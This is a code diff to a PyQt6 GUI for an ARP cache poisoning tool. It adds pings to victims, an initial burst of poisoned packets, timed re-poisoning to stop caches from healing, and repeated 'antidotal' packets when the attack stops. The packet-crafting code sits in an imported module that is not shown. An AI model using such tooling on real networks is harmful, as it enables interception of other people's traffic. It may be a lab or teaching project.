@@ -2,7 +2,7 @@ from PyQt6.QtCore import *
 from PyQt6.QtGui import *
 from PyQt6.QtWidgets import *
 from components import HostList, VictimList, InterfaceChooser, Toggle
-from attacks import ARPAttackSettings, send_poisonous_packets, send_antidotal_packets
+from attacks import ARPAttackSettings, send_poisonous_packets, send_antidotal_packets, send_poisonous_pings
 
 class AttackWorker(QObject):
     finished = pyqtSignal()
@@ -14,9 +14,14 @@ class AttackWorker(QObject):
     def run(self):
         print('Attack startng')
 
+        # Ping victims to ensure they know of each others existence
+        send_poisonous_pings(self.settings)
+
+        # do the initial chache poisoning
         for _ in range(self.settings.initial_packets):
             send_poisonous_packets(self.settings)
 
+        # perform poisoning every so often to prevent chache healing
         self.timer = QTimer(self)
         self.timer.timeout.connect(self.poison)
         self.timer.start(self.settings.seconds_interval * 1000)
@@ -27,7 +32,11 @@ class AttackWorker(QObject):
 
     def stop(self):
         print('Attack stopping...')
-        send_antidotal_packets(self.settings)
+
+        # heal the victims' caches
+        for _ in range(self.settings.initial_packets):
+            send_antidotal_packets(self.settings)
+
         self.timer.stop()
         self.finished.emit()
 
